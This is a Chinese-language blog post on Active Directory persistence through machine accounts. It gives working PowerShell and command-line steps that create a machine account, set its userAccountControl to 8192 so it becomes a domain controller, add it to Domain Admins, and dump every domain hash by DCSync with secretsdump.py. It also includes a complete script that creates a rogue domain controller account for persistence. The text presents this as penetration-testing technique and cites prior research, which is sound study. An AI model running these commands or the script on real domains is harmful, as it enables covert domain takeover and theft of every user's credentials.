---
title: Domain Persistence – Machine Account
date: 2022-01-17 16:25:00 +0800
author: WHOAMI
toc: true
categories: ["Windows Security"]
tags: ["Domain Persistence", "Active Directory"]
layout: post
---

机器帐户被许多技术用于特权升级和横向移动，但也有通过机器帐户建立域持久性的情况。这涉及将任意机器帐户添加到特权组（例如域管理员组）或修改机器帐户的 `userAccountControl` 属性，使其转换为域控制器。在这两种情况下，攻击者都可以通过机器帐户进行身份验证并执行特权操作，例如通过  DCSync 导出所有域哈希等。

[@Sean Metcalf](https://twitter.com/PyroTek3) 是第一个公开披露如何通过将机器帐户添加到高权限组来将机器帐户用作域持久性后门的人，此方法与向域管理员组添加标准用户帐户相同。2020 年， [@Stealthbits](https://twitter.com/Stealthbits) 发布了一篇名为 [*SERVER (UN)TRUST ACCOUNT*](https://stealthbits.com/blog/server-untrust-account/) 的文章，展示了另一种持久性技术，其中涉及如何从机器帐户进行 Active Directory 复制。尽管通过 DCSync 技术转储密码哈希并不新鲜，并且相关操作可能会触发适当的警报，但使用机器帐户执行相同的技术能够达到更隐蔽的目的。



## userAccountControl

在活动目录中，`userAccountControl` 是每一个账户的必备属性，该属性是一个位字段，不同的标志位代表不同的用户信息，该属性的值为所有标志位值的和。

![](https://s2.loli.net/2022/03/17/Iqr2HX74ncJyEPi.png)

下图是微软官方文档中给出的可能标志位，以及其十六进制和十进制值，详情请参考：[Use the UserAccountControl flags to manipulate user account properties](https://docs.microsoft.com/en-us/troubleshoot/windows-server/identity/useraccountcontrol-manipulate-account-properties)。

![](https://s2.loli.net/2022/03/17/tSh4HkTerp6K9Vf.png)

`userAccountControl` 中有一个名为 `SERVER_TRUST_ACCOUNT` 的标志位，其十六进制值为 0x2000，十进制值为 8192，用来表示该账户是域控制器的机器帐户。当机器账户的 `userAccountControl` 属性设置了 `SERVER_TRUST_ACCOUNT` 位后，Active Directory 必须将该账户的 `primaryGroupId` 属性设置为域控制器组的 RID。因此，只需更改 `userAccountControl` 即可为普通域成员机器授予域控制器的特权。

在实战中，攻击者可以通过滥用 `userAccountControl` 属性，将普通域内机器的身份变为域控制器，并配合 DCSync 技术实现域持久化。具体做法比较简单，就是将机器账户的 `userAccountControl` 属性值设置为 8192。

（1）在域控制器上执行以下命令，通过 [Powermad](https://github.com/Kevin-Robertson/Powermad) 在域内创建一个名为 `PENTEST$` 的机器账户，账户密码设为 `Passw0rd`。

```powershell
Import-Module .\Powermad.ps1
# 设置机器账户的密码
$Password = ConvertTo-SecureString 'Passw0rd' -AsPlainText -Force
# 通过 New-MachineAccount 函数创建一个机器账户
New-MachineAccount -MachineAccount "PENTEST" -Password $($Password) -Domain "pentest.com" -DomainController "DC01.pentest.com" -Verbose
```

![](https://s2.loli.net/2022/03/17/e2EmxrdYOHJTSR1.png)

（2）执行以下命令，通过 [PowerView.ps1](https://github.com/shigophilo/tools/blob/master/PowerView.ps1) 查询新添加的机器账户 `PENTEST$`。可以看到，账户 `PENTEST$` 的主要组 ID（`primaryGroupId`）为 515，这是 Domian Computers 组的 RID，说明 `PENTEST$` 此时还是一台普通域成员机器，如下图所示。

```powershell
Import-Module .\PowerView.ps1
Get-NetComputer -Identity "PENTEST" -Properties name, primaryGroupID, userAccountControl
```

![](https://s2.loli.net/2022/03/17/EydCaD1jGWRZM8J.png)

（3）执行以下命令，通过 PowerView.ps1 将 `PENTEST$` 账户的 `userAccountControl` 属性值设为 8192，这将更改账户的主要组 ID 为 516，如图下所示。此时，`PENTEST$` 账户的主要组被改为了 Domain Controllers，也就是域控制器组。

```powershell
Import-Module .\PowerView.ps1
Set-DomainObject -Identity "PENTEST$" -Set @{"userAccountControl" = 8192} -Verbose
```

![](https://s2.loli.net/2022/03/17/QidlvPF4Kcxn5MR.png)

如下图所示，此时 `PENTEST$` 账户已经是一台域控制器了。

![](https://s2.loli.net/2022/03/17/ih6fPeKzpEZvJkY.png)

（4）由于其拥有所需的特权并且账户密码已知，所以可直接通过 secretsdump.py 执行 DCSync 操作来导出域用户哈希，如图所示。

```cmd
python3 secretsdump.py pentest.com/PENTEST\$:Passw0rd@172.26.10.11 -just-dc
```

![](https://s2.loli.net/2022/03/17/4YvjwnardLbGKER.png)

根据上述利用过程，我编写了一个简单的 PowerShell 脚本 NewDomainController.ps1，以下是完整的代码。

```powershell
Function NewDomainController {
<#
.SYNOPSIS
    This script will create a new domain controller account in the domain for the purpose of domain persistence.
.DESCRIPTION
    In Active Directory, userAccountControl is a necessary attribute of each account. This attribute is a bit 
    field. Different flags represent different user information. The value of this attribute is the sum of all 
    flags. There is a flag named SERVER_TRUST_ACCOUNT in userAccountControl, whose hexadecimal value is 0x2000 
    and decimal value is 8192, which is used to indicate that the account is the machine account of the domain 
    controller. When a machine account's userAccountControl attribute has the SERVER_TRUST_ACCOUNT bit set, 
    Active Directory must set the account's primaryGroupId attribute to the RID of the domain controller group. 
    So just change userAccountControl to grant domain controller privileges to normal domain member machines.
.LINK
    https://whoamianony.top/domain-persistence-machine-accounts/
.PARAMETER Domain
    Specifies the domain name, if omitted, the domain name will be obtained automatically.
.PARAMETER DomainController
    Specifies the FQDN of the domain controller.
.PARAMETER MachineAccount
    Specifies the name of the machine account to be created.
.PARAMETER Password
    Specifies the password of the machine account to be created.
.OUTPUTS
    Output will be shown in the console
.NOTES
    Version:        0.1
    Author:         WHOAMI
    Blog:           https://whoamianony.top/
    Date:           01/18/2022
.EXAMPLE
    NewDomainController -MachineAccount "PENTEST" -Password "Passw0rd" -Domain "pentest.com" -DomainController "DC01.pentest.com"
#>

    param (
        [Parameter(Mandatory = $false)]
        [ValidateNotNullOrEmpty()]
        [string]$Domain,

        [Parameter(Mandatory = $false)]
        [ValidateNotNullOrEmpty()]
        [string]$DomainController,

        [Parameter(Mandatory = $false)]
        [ValidateNotNullOrEmpty()]
        [string]$MachineAccount,

        [Parameter(Mandatory = $false)]
        [ValidateNotNullOrEmpty()]
        [string]$Password
    )


    function FormatStatus([string]$Flag, [string]$Message) {
        If($Flag -eq "1") {
            Write-Host "[+] " -ForegroundColor:Green -NoNewline
            Write-Host $Message
        }ElseIf($Flag -eq "0") {
            Write-Host "[-] " -ForegroundColor:Red -NoNewline
            Write-Host $Message
        }
    }
    

    $null = [System.Reflection.Assembly]::LoadWithPartialName("System.DirectoryServices.Protocols")

    if($Password)
    {
        $SecurePassword = $Password | ConvertTo-SecureString -AsPlainText -Force
        $PasswordBSTR = [System.Runtime.InteropServices.Marshal]::SecureStringToBSTR($SecurePassword)
        $PasswordClearText = [System.Runtime.InteropServices.Marshal]::PtrToStringAuto($PasswordBSTR)
        $PasswordClearText = [System.Text.Encoding]::Unicode.GetBytes('"' + $PasswordClearText + '"')
    }

    if(!$DomainController -or !$Domain)
    {
        try
        {
            $CurrentDomain = [System.DirectoryServices.ActiveDirectory.Domain]::GetCurrentDomain()
        }
        catch
        {
            FormatStatus 0 "$($_.Exception.Message)"
            throw
        }

        if(!$DomainController)
        {
            $DomainController = $CurrentDomain.PdcRoleOwner.Name
            FormatStatus 1 "Get Domain Controller: $DomainController"
        }

        if(!$Domain)
        {
            $Domain = $CurrentDomain.Name
            $Domain = $Domain.ToLower()
            FormatStatus 1 "Get Domain Name: $Domain"
        }
    }

    $_MachineAccount = $MachineAccount

    if($MachineAccount.EndsWith('$'))
    {
        $SAMAccountName = $_MachineAccount
        $_MachineAccount = $_MachineAccount.SubString(0,$_MachineAccount.Length - 1)
    }
    else 
    {
        $SAMAccountName = $_MachineAccount + "$"
    }

    FormatStatus 1 "Get SAMAccountName: $SAMAccountName" 


    $DistinguishedName = "CN=$_MachineAccount,CN=Computers"
    $DC_array = $Domain.Split(".")

    ForEach($DC in $DC_array)
    {
        $DistinguishedName += ",DC=$DC"
    }

    FormatStatus 1 "Get DistinguishedName: $DistinguishedName"

    FormatStatus 1 "Start creating a machine account $MachineAccount"
    $identifier = New-Object System.DirectoryServices.Protocols.LdapDirectoryIdentifier($DomainController,389)
    $connection = New-Object System.DirectoryServices.Protocols.LdapConnection($identifier)

    $connection.SessionOptions.Sealing = $true
    $connection.SessionOptions.Signing = $true
    $connection.Bind()
    $request = New-Object -TypeName System.DirectoryServices.Protocols.AddRequest
    FormatStatus 1 "Set the DistinguishedName property of the $MachineAccount account to $DistinguishedName"
    $request.DistinguishedName = $DistinguishedName
    $request.Attributes.Add((New-Object "System.DirectoryServices.Protocols.DirectoryAttribute" -ArgumentList "objectClass","Computer")) > $null
    FormatStatus 1 "Set the DistinguishedName property of the $MachineAccount account to $SAMAccountName"
    $request.Attributes.Add((New-Object "System.DirectoryServices.Protocols.DirectoryAttribute" -ArgumentList "SamAccountName",$SAMAccountName)) > $null
    FormatStatus 1 "Set the userAccountControl property of the $MachineAccount account to 8192"
    $request.Attributes.Add((New-Object "System.DirectoryServices.Protocols.DirectoryAttribute" -ArgumentList "userAccountControl","8192")) > $null
    FormatStatus 1 "Register the DnsHostName of the $MachineAccount account as $_MachineAccount.$Domain"
    $request.Attributes.Add((New-Object "System.DirectoryServices.Protocols.DirectoryAttribute" -ArgumentList "DnsHostName","$_MachineAccount.$Domain")) > $null
    FormatStatus 1 "Start registering SPN for $MachineAccount account: HOST/$_MachineAccount.$Domain, RestrictedKrbHost/$_MachineAccount.$Domain"
    $request.Attributes.Add((New-Object "System.DirectoryServices.Protocols.DirectoryAttribute" -ArgumentList "ServicePrincipalName","HOST/$_MachineAccount.$Domain","RestrictedKrbHost/$_MachineAccount.$Domain","HOST/$_MachineAccount","RestrictedKrbHost/$_MachineAccount")) > $null
    FormatStatus 1 "Set the password for the $MachineAccount account to $Password"
    $request.Attributes.Add((New-Object "System.DirectoryServices.Protocols.DirectoryAttribute" -ArgumentList "unicodePwd",$PasswordClearText)) > $null

    try
    {
        $connection.SendRequest($request) > $null
        FormatStatus 1  "Create machine account $MachineAccount successfully"
    }
    catch
    {
        FormatStatus 0  "$($_.Exception.Message)"

        if($error_message -like '*Exception calling "SendRequest" with "1" argument(s): "The server cannot handle directory requests."*')
        {
            FormatStatus 0 "User may have reached ms-DS-MachineAccountQuota limit"
        }

    }
}
```

运行该脚本即可创建一个新的域控账户，如下图所示。

```powershell
Import-Module .\NewDomainController.ps1
NewDomainController -MachineAccount "PENTEST" -Password "Passw0rd" -Domain "pentest.com" -DomainController "DC01.pentest.com"
```

![](https://s2.loli.net/2022/03/17/48CHbZp2fNnky7x.png)

## 加入特权组

机器帐户可以属于安全组，因此可以直接将机器账户加入特权组，以实现域持久性。例如，执行以下命令，将机器账户 `PENTEST$` 加入到域管理员组（Domain Admins），如下图所示。

```cmd
net group "Domain Admins" PENTEST$ /add /domain
```

![](https://s2.loli.net/2022/03/17/VwaWkEnNjg2OrUM.png)

如图下所示，获得域管理员权限的机器账户可成功导出域内用户哈希。

![](https://s2.loli.net/2022/03/17/k2BFWmxAZnX76d5.png)

值得注意的是，如果机器账户位于像 Domain Admins 这样的特权组，那么机器账户是被允许登录的，如下图所示：

![](https://whoamianony.oss-cn-beijing.aliyuncs.com/img/image-20220507122049517.png)

## Ending......

参考文献：

> https://pentestlab.blog/2022/01/17/domain-persistence-machine-account/
>
> https://stealthbits.com/blog/server-untrust-account/
>
> https://adsecurity.org/?p=2753
